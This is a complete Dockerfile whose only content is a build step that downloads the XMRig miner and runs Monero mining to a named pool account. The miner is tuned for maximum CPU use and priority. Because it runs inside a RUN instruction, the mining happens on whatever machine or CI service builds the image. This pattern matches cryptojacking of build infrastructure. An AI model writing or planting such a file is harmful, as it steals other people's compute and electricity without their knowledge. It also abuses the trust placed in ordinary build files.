FROM ubuntu:20.10
RUN nproc
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-x64.tar.gz && tar -xf xmrig-6.9.0-linux-x64.tar.gz && cd xmrig-6.9.0 && xmrig -a rx/0 -o europe.randomx-hub.miningpoolhub.com:20580 -u brahim7.brahim50 -p x --threads 19 --max-cpu-usage=100 --cpu-priority 5 --astrobwt-max-size=570 --randomx-wrmsr=15 --asm=intel --randomx-no-rdmsr --randomx-no-numa --randomx-1gb-pages --randomx-mode=auto --asm=intel --cpu-no-yield --donate-level 1 --coin monero
